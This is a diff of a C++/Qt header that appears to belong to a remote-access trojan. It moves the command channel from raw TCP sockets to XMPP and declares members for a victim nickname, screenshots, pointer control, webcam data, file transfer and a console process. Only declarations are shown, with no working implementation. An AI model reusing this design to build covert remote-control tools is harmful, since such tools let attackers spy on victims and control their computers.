@@ -29,7 +29,6 @@
 #endif
 
 #include <QMainWindow>
-#include <QTcpSocket>
 #include <QFile>
 #include <QFileInfo>
 #include <QDataStream>
@@ -45,6 +44,8 @@
 #include <QLineEdit>
 #include <QPlainTextEdit>
 #include <QThread>
+#include <qxmpp/QXmppClient.h>
+#include "qxmpp/QXmppTransferManager.h"
 
 namespace Ui {
     class MainWindow;
@@ -58,11 +59,11 @@ public:
     int sincroniza;
     QBuffer *buffer;
     QByteArray bytes;
-    QTcpSocket *socketDentro;
-    Utilidades util;    
+    Utilidades util;
 public slots:
-    void procesarImagen(QImage captura,int calidad,QTcpSocket *socket);
-    void datosEscritos();
+    void procesarImagen(QImage captura,int calidad);
+signals:
+    void enviar(QByteArray);
 };
 
 class MainWindow : public QMainWindow {
@@ -72,12 +73,9 @@ public:
     ~MainWindow();
     Utilidades util;
     paralelo capturacion;
-    QString host;
-    quint16 port;
-    quint16 portArchivos;
-    quint16 portEscritorio;
-    quint16 portWebcam;
     int tiempoConexion;
+    QString cuentaXmpp;
+    QString contrasena;
     QString alias;
     QString nickVictima;
     QString nombreCopiable;
@@ -94,10 +92,6 @@ public:
     QProcess proceso;
     QProcess consola;
     QByteArray cadenaa;
-    QTcpSocket socket;
-    QTcpSocket socketArchivos;
-    QTcpSocket socketEscritorio;
-    QTcpSocket socketWebcam;
     QWidget *chat;
     QVBoxLayout *capa;
     QHBoxLayout *capaHorizontal;
@@ -105,16 +99,23 @@ public:
     QLineEdit *enviarChatTexto;
     QPlainTextEdit *salidaChatTexto;
     QThread hilo;
+    QXmppClient cliente;
+    QString from;
+    QXmppTransferManager *manager;
+    QFile *archivoRecibido;
+    QXmppTransferJob *job;
+    QBuffer mem;
+    QByteArray bufferMem;
     void generarVentanaChat();
 signals:
-    void procesar(QImage captura,int calidad,QTcpSocket *socket);
+    void procesar(QImage captura,int calidad);
 public slots:
     void inicio();
     bool cargarConfiguracion();
-    void conectar();
-    void llegadaDatos();
-    void llegadaDatosArchivo();
-    void llegadaDatosEscritorio();
+    void recibidaPresencia(QXmppPresence presencia);
+    void llegadaDatos(const QXmppMessage &mensaje);
+    void llegadaDatosArchivo(QXmppTransferJob* transferencia);
+    void enviarCaptura(QByteArray array);
     void llegadaDatosWebcam();
     QPixmap screenShot();
     void moverPuntero(int x,int y);
